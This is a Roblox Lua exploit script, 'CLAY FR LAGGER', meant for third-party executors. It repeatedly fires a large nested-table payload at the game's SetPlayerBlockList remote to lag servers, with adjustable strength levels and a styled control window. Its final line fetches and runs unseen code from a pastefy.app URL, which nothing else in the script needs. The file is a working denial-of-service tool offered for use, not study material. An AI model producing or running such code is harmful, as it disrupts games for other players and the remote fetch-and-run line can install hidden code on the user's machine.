local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local LP = Players.LocalPlayer

local PURPLE = Color3.fromRGB(138, 43, 226)
local PURPLE_DARK = Color3.fromRGB(60, 15, 120)
local PURPLE_MID = Color3.fromRGB(80, 20, 140)
local PURPLE_LIGHT = Color3.fromRGB(180, 100, 255)
local PURPLE_SOFT = Color3.fromRGB(215, 180, 255)
local WHITE = Color3.fromRGB(255, 255, 255)
local STROKE = Color3.fromRGB(200, 130, 255)

local LEVELS = {
	WEAK = {power = 25},
	MEDIUM = {power = 32},
	STRONG = {power = 35},
	["VERY STRONG"] = {power = 70},
}
local MODE_ORDER = {"WEAK", "MEDIUM", "STRONG", "VERY STRONG"}

local CONFIG_FILE = "ClayFRLaggerConfig.json"
local keybind = Enum.KeyCode.X
local listeningForKey = false
local laggerActive = false
local currentLevel = "VERY STRONG"
local windowLocked = false
local isMinimized = false
local customPower = nil
local lagThread = nil
local payloadCache = {}

local function saveConfig()
	pcall(function()
		if not writefile then return end
		writefile(CONFIG_FILE, HttpService:JSONEncode({
			Keybind = keybind.Name,
			Level = currentLevel,
			Locked = windowLocked,
			Power = customPower,
		}))
	end)
end

pcall(function()
	if isfile and isfile(CONFIG_FILE) then
		local d = HttpService:JSONDecode(readfile(CONFIG_FILE))
		if d.Keybind and Enum.KeyCode[d.Keybind] then
			keybind = Enum.KeyCode[d.Keybind]
		end
		if d.Level and LEVELS[d.Level] then
			currentLevel = d.Level
		end
		windowLocked = d.Locked == true
		if type(d.Power) == "number" then
			customPower = d.Power
		end
	end
end)

local function getPayload(power)
	if payloadCache[power] then
		return payloadCache[power]
	end
	local chain = {}
	local last = chain
	for _ = 1, 25 do
		local t = {}
		table.insert(last, t)
		last = t
	end
	local max = math.min(12000, power * 50)
	local main = {}
	for _ = 1, max do
		table.insert(main, chain)
	end
	payloadCache[power] = main
	return main
end

local function fireLag(power)
	pcall(function()
		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(getPayload(power))
	end)
end

local function getActivePower()
	if type(customPower) == "number" and customPower > 0 then
		return customPower
	end
	return LEVELS[currentLevel].power
end

local function startLag()
	if lagThread then
		pcall(function()
			task.cancel(lagThread)
		end)
		lagThread = nil
	end
	laggerActive = true
	lagThread = task.spawn(function()
		while laggerActive do
			pcall(function()
				game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
			end)
			fireLag(getActivePower())
			task.wait(0.18)
		end
	end)
end

local function stopLag()
	laggerActive = false
	if lagThread then
		pcall(function()
			task.cancel(lagThread)
		end)
		lagThread = nil
	end
end

local parent = nil
pcall(function()
	if typeof(gethui) == "function" then
		parent = gethui()
	end
end)
if not parent then
	pcall(function()
		parent = game:GetService("CoreGui")
	end)
end
if not parent then
	parent = LP:WaitForChild("PlayerGui")
end

for _, v in ipairs(parent:GetChildren()) do
	if v.Name == "ClayFRLagger" then
		v:Destroy()
	end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ClayFRLagger"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 50
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function()
	if syn and syn.protect_gui then
		syn.protect_gui(ScreenGui)
	end
end)
ScreenGui.Parent = parent

local Main = Instance.new("Frame")
Main.Name = "MainFrame"
Main.Active = true
Main.Position = UDim2.new(0.5, -140, 0.5, -75)
Main.Size = UDim2.new(0, 280, 0, 150)
Main.BackgroundColor3 = PURPLE
Main.BackgroundTransparency = 0.15
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Parent = ScreenGui
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)

local Bg = Instance.new("ImageLabel")
Bg.ZIndex = 0
Bg.Size = UDim2.new(1, 0, 1, 0)
Bg.BackgroundTransparency = 1
Bg.Image = "rbxassetid://86057063967853"
Bg.ImageTransparency = 0.4
Bg.ScaleType = Enum.ScaleType.Crop
Bg.Parent = Main
Instance.new("UICorner", Bg).CornerRadius = UDim.new(0, 14)

local Grad = Instance.new("UIGradient")
Grad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 100, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 160, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 80, 240)),
})
Grad.Rotation = 188
Grad.Parent = Main

local Stroke = Instance.new("UIStroke")
Stroke.Color = STROKE
Stroke.Thickness = 2
Stroke.Transparency = 0.3
Stroke.Parent = Main
local StrokeGrad = Instance.new("UIGradient")
StrokeGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 170, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 100, 255)),
})
StrokeGrad.Rotation = 278
StrokeGrad.Parent = Stroke

local Header = Instance.new("Frame")
Header.ZIndex = 3
Header.Size = UDim2.new(1, 0, 0, 34)
Header.BackgroundTransparency = 1
Header.Parent = Main

local Title = Instance.new("TextLabel")
Title.ZIndex = 4
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Size = UDim2.new(1, -90, 1, 0)
Title.BackgroundTransparency = 1
Title.Text = "CLAY FR LAGGER"
Title.TextColor3 = WHITE
Title.TextSize = 15
Title.Font = Enum.Font.GothamBlack
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextStrokeColor3 = Color3.fromRGB(100, 0, 150)
Title.TextStrokeTransparency = 0.8
Title.Parent = Header
local TitleGrad = Instance.new("UIGradient")
TitleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 150, 255)),
})
TitleGrad.Parent = Title

local MinBtn = Instance.new("TextButton")
MinBtn.ZIndex = 5
MinBtn.Position = UDim2.new(1, -28, 0, 6)
MinBtn.Size = UDim2.new(0, 22, 0, 22)
MinBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MinBtn.BackgroundTransparency = 0.2
MinBtn.BorderSizePixel = 0
MinBtn.Text = "-"
MinBtn.TextColor3 = WHITE
MinBtn.TextSize = 16
MinBtn.Font = Enum.Font.GothamBold
MinBtn.AutoButtonColor = false
MinBtn.Parent = Header
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 6)

local Divider = Instance.new("Frame")
Divider.ZIndex = 3
Divider.Position = UDim2.new(0, 10, 0, 34)
Divider.Size = UDim2.new(1, -20, 0, 1)
Divider.BackgroundColor3 = STROKE
Divider.BorderSizePixel = 0
Divider.Parent = Main

local Body = Instance.new("Frame")
Body.ZIndex = 2
Body.Position = UDim2.new(0, 0, 0, 35)
Body.Size = UDim2.new(1, 0, 1, -35)
Body.BackgroundTransparency = 1
Body.Parent = Main

local LagRow = Instance.new("Frame")
LagRow.ZIndex = 3
LagRow.Position = UDim2.new(0, 10, 0, 8)
LagRow.Size = UDim2.new(1, -20, 0, 30)
LagRow.BackgroundColor3 = PURPLE_DARK
LagRow.BackgroundTransparency = 0.15
LagRow.BorderSizePixel = 0
LagRow.Parent = Body
Instance.new("UICorner", LagRow)
local LagStroke = Instance.new("UIStroke")
LagStroke.Color = PURPLE_LIGHT
LagStroke.Transparency = 0.5
LagStroke.Parent = LagRow

local LagLbl = Instance.new("TextLabel")
LagLbl.ZIndex = 4
LagLbl.Position = UDim2.new(0, 10, 0, 0)
LagLbl.Size = UDim2.new(0, 60, 1, 0)
LagLbl.BackgroundTransparency = 1
LagLbl.Text = "LAGGER"
LagLbl.TextColor3 = WHITE
LagLbl.TextSize = 11
LagLbl.Font = Enum.Font.GothamBlack
LagLbl.TextXAlignment = Enum.TextXAlignment.Left
LagLbl.Parent = LagRow

local PcLbl = Instance.new("TextLabel")
PcLbl.ZIndex = 4
PcLbl.Position = UDim2.new(0, 74, 0, 0)
PcLbl.Size = UDim2.new(1, -130, 1, 0)
PcLbl.BackgroundTransparency = 1
PcLbl.Text = "PC REQUIRED!"
PcLbl.TextColor3 = PURPLE_SOFT
PcLbl.TextSize = 9
PcLbl.Font = Enum.Font.GothamBold
PcLbl.Parent = LagRow

local Track = Instance.new("Frame")
Track.ZIndex = 5
Track.Position = UDim2.new(1, -48, 0.5, -10)
Track.Size = UDim2.new(0, 40, 0, 20)
Track.BackgroundColor3 = PURPLE_DARK
Track.BorderSizePixel = 0
Track.Parent = LagRow
Instance.new("UICorner", Track).CornerRadius = UDim.new(0, 10)
local TrackStroke = Instance.new("UIStroke")
TrackStroke.Color = Color3.fromRGB(160, 80, 240)
TrackStroke.Parent = Track

local Knob = Instance.new("Frame")
Knob.ZIndex = 6
Knob.Position = UDim2.new(0, 2, 0.5, -6)
Knob.Size = UDim2.new(0, 13, 0, 13)
Knob.BackgroundColor3 = Color3.fromRGB(160, 80, 240)
Knob.BorderSizePixel = 0
Knob.Parent = Track
Instance.new("UICorner", Knob).CornerRadius = UDim.new(0, 4)

local ToggleHit = Instance.new("TextButton")
ToggleHit.ZIndex = 7
ToggleHit.Position = UDim2.new(1, -64, 0, 0)
ToggleHit.Size = UDim2.new(0, 56, 1, 0)
ToggleHit.BackgroundTransparency = 1
ToggleHit.Text = ""
ToggleHit.AutoButtonColor = false
ToggleHit.Parent = LagRow

local ModeRow = Instance.new("Frame")
ModeRow.ZIndex = 3
ModeRow.Position = UDim2.new(0, 10, 0, 44)
ModeRow.Size = UDim2.new(1, -20, 0, 26)
ModeRow.BackgroundColor3 = PURPLE_DARK
ModeRow.BackgroundTransparency = 0.15
ModeRow.BorderSizePixel = 0
ModeRow.Parent = Body
Instance.new("UICorner", ModeRow)
local ModeStroke = Instance.new("UIStroke")
ModeStroke.Color = PURPLE_LIGHT
ModeStroke.Transparency = 0.5
ModeStroke.Parent = ModeRow
local ModePad = Instance.new("UIPadding")
ModePad.PaddingTop = UDim.new(0, 4)
ModePad.PaddingBottom = UDim.new(0, 4)
ModePad.PaddingLeft = UDim.new(0, 4)
ModePad.PaddingRight = UDim.new(0, 4)
ModePad.Parent = ModeRow
local ModeList = Instance.new("UIListLayout")
ModeList.Padding = UDim.new(0, 4)
ModeList.FillDirection = Enum.FillDirection.Horizontal
ModeList.HorizontalAlignment = Enum.HorizontalAlignment.Center
ModeList.Parent = ModeRow

local modeButtons = {}

local BotRow = Instance.new("Frame")
BotRow.ZIndex = 3
BotRow.Position = UDim2.new(0, 10, 0, 76)
BotRow.Size = UDim2.new(1, -20, 0, 26)
BotRow.BackgroundColor3 = PURPLE_DARK
BotRow.BackgroundTransparency = 0.15
BotRow.BorderSizePixel = 0
BotRow.Parent = Body
Instance.new("UICorner", BotRow)
local BotStroke = Instance.new("UIStroke")
BotStroke.Color = PURPLE_LIGHT
BotStroke.Transparency = 0.5
BotStroke.Parent = BotRow

local KeyBtn = Instance.new("TextButton")
KeyBtn.ZIndex = 4
KeyBtn.Position = UDim2.new(0, 4, 0.5, -9)
KeyBtn.Size = UDim2.new(0, 54, 0, 18)
KeyBtn.BackgroundColor3 = PURPLE_MID
KeyBtn.BackgroundTransparency = 0.15
KeyBtn.Text = "KEY: " .. keybind.Name
KeyBtn.TextColor3 = PURPLE_SOFT
KeyBtn.TextSize = 9
KeyBtn.Font = Enum.Font.GothamBold
KeyBtn.AutoButtonColor = false
KeyBtn.Parent = BotRow
Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 6)
local KeyStroke = Instance.new("UIStroke")
KeyStroke.Color = Color3.fromRGB(160, 80, 240)
KeyStroke.Transparency = 0.5
KeyStroke.Parent = KeyBtn

local LockBtn = Instance.new("TextButton")
LockBtn.ZIndex = 4
LockBtn.Position = UDim2.new(0, 62, 0.5, -9)
LockBtn.Size = UDim2.new(0, 54, 0, 18)
LockBtn.BackgroundColor3 = PURPLE_MID
LockBtn.BackgroundTransparency = 0.15
LockBtn.Text = windowLocked and "LOCK" or "UNLOCK"
LockBtn.TextColor3 = PURPLE_SOFT
LockBtn.TextSize = 9
LockBtn.Font = Enum.Font.GothamBold
LockBtn.AutoButtonColor = false
LockBtn.Parent = BotRow
Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 6)
local LockStroke = Instance.new("UIStroke")
LockStroke.Color = Color3.fromRGB(160, 80, 240)
LockStroke.Transparency = 0.5
LockStroke.Parent = LockBtn

local PingLbl = Instance.new("TextLabel")
PingLbl.ZIndex = 4
PingLbl.Position = UDim2.new(0, 120, 0.5, -8)
PingLbl.Size = UDim2.new(0, 50, 0, 16)
PingLbl.BackgroundTransparency = 1
PingLbl.Text = "0 ms"
PingLbl.TextColor3 = PURPLE_SOFT
PingLbl.TextSize = 9
PingLbl.Font = Enum.Font.GothamBold
PingLbl.TextXAlignment = Enum.TextXAlignment.Left
PingLbl.Parent = BotRow

local SzLbl = Instance.new("TextLabel")
SzLbl.ZIndex = 4
SzLbl.Position = UDim2.new(1, -88, 0.5, -8)
SzLbl.Size = UDim2.new(0, 24, 0, 16)
SzLbl.BackgroundTransparency = 1
SzLbl.Text = "SZ:"
SzLbl.TextColor3 = PURPLE_SOFT
SzLbl.TextSize = 9
SzLbl.Font = Enum.Font.GothamBold
SzLbl.Parent = BotRow

local SzBox = Instance.new("TextBox")
SzBox.ZIndex = 4
SzBox.Position = UDim2.new(1, -62, 0.5, -9)
SzBox.Size = UDim2.new(0, 56, 0, 18)
SzBox.BackgroundColor3 = PURPLE_MID
SzBox.BackgroundTransparency = 0.15
SzBox.Text = tostring(customPower or LEVELS[currentLevel].power)
SzBox.TextColor3 = WHITE
SzBox.TextSize = 9
SzBox.Font = Enum.Font.GothamBold
SzBox.ClearTextOnFocus = false
SzBox.Parent = BotRow
Instance.new("UICorner", SzBox).CornerRadius = UDim.new(0, 6)
local SzStroke = Instance.new("UIStroke")
SzStroke.Color = Color3.fromRGB(160, 80, 240)
SzStroke.Transparency = 0.5
SzStroke.Parent = SzBox

local function setToggleVisual(on)
	TweenService:Create(Knob, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
		Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 2, 0.5, -6),
		BackgroundColor3 = on and Color3.fromRGB(220, 160, 255) or Color3.fromRGB(160, 80, 240),
	}):Play()
	TweenService:Create(Track, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
		BackgroundColor3 = on and Color3.fromRGB(120, 40, 200) or PURPLE_DARK,
	}):Play()
end

local function refreshModes()
	for name, btn in pairs(modeButtons) do
		local on = name == currentLevel
		btn.BackgroundColor3 = on and PURPLE_LIGHT or PURPLE_MID
		btn.BackgroundTransparency = on and 0.05 or 0.15
		btn.TextColor3 = on and WHITE or PURPLE_SOFT
	end
	if not customPower then
		SzBox.Text = tostring(LEVELS[currentLevel].power)
	end
end

local function toggleLagger()
	if laggerActive then
		stopLag()
	else
		startLag()
	end
	setToggleVisual(laggerActive)
end

for _, name in ipairs(MODE_ORDER) do
	local btn = Instance.new("TextButton")
	btn.ZIndex = 4
	btn.Size = UDim2.new(0.25, -4, 1, 0)
	btn.BackgroundColor3 = PURPLE_MID
	btn.BackgroundTransparency = 0.15
	btn.BorderSizePixel = 0
	btn.Text = name
	btn.TextColor3 = PURPLE_SOFT
	btn.Font = Enum.Font.GothamBlack
	btn.TextScaled = true
	btn.AutoButtonColor = false
	btn.Parent = ModeRow
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	local ts = Instance.new("UITextSizeConstraint")
	ts.MaxTextSize = 9
	ts.MinTextSize = 6
	ts.Parent = btn
	modeButtons[name] = btn
	btn.MouseButton1Click:Connect(function()
		currentLevel = name
		customPower = nil
		SzBox.Text = tostring(LEVELS[name].power)
		refreshModes()
		saveConfig()
		if laggerActive then
			startLag()
		end
	end)
end
refreshModes()

ToggleHit.MouseButton1Click:Connect(toggleLagger)

KeyBtn.MouseButton1Click:Connect(function()
	if listeningForKey then
		return
	end
	listeningForKey = true
	KeyBtn.Text = "KEY: ..."
	KeyBtn.TextColor3 = WHITE
end)

LockBtn.MouseButton1Click:Connect(function()
	windowLocked = not windowLocked
	LockBtn.Text = windowLocked and "LOCK" or "UNLOCK"
	saveConfig()
end)

SzBox.FocusLost:Connect(function()
	local n = tonumber(SzBox.Text)
	if n and n > 0 then
		customPower = math.clamp(math.floor(n), 1, 200)
		SzBox.Text = tostring(customPower)
		saveConfig()
		if laggerActive then
			startLag()
		end
	else
		customPower = nil
		SzBox.Text = tostring(LEVELS[currentLevel].power)
	end
end)

MinBtn.MouseButton1Click:Connect(function()
	isMinimized = not isMinimized
	Body.Visible = not isMinimized
	Divider.Visible = not isMinimized
	MinBtn.Text = isMinimized and "+" or "-"
	TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
		Size = isMinimized and UDim2.new(0, 280, 0, 34) or UDim2.new(0, 280, 0, 150),
	}):Play()
end)

local dragging = false
local dragStart = nil
local startPos = nil
Header.InputBegan:Connect(function(input)
	if windowLocked then
		return
	end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Main.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if not dragging or windowLocked then
		return
	end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local d = input.Position - dragStart
		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)

UserInputService.InputBegan:Connect(function(inp, gp)
	if listeningForKey then
		if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode ~= Enum.KeyCode.Unknown then
			keybind = inp.KeyCode
			KeyBtn.Text = "KEY: " .. keybind.Name
			KeyBtn.TextColor3 = PURPLE_SOFT
			listeningForKey = false
			saveConfig()
		end
		return
	end
	if gp then
		return
	end
	if inp.KeyCode == keybind then
		toggleLagger()
	end
	if inp.KeyCode == Enum.KeyCode.RightControl or inp.KeyCode == Enum.KeyCode.Insert then
		ScreenGui.Enabled = not ScreenGui.Enabled
	end
end)

task.spawn(function()
	while ScreenGui.Parent do
		local ping = 0
		pcall(function()
			local item = Stats.Network.ServerStatsItem["Data Ping"]
			if item then
				ping = math.floor(item:GetValue())
			end
		end)
		if ping == 0 then
			pcall(function()
				ping = math.floor((LP:GetNetworkPing() or 0) * 1000)
			end)
		end
		PingLbl.Text = tostring(ping) .. " ms"
		task.wait(0.5)
	end
end)

setToggleVisual(false)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()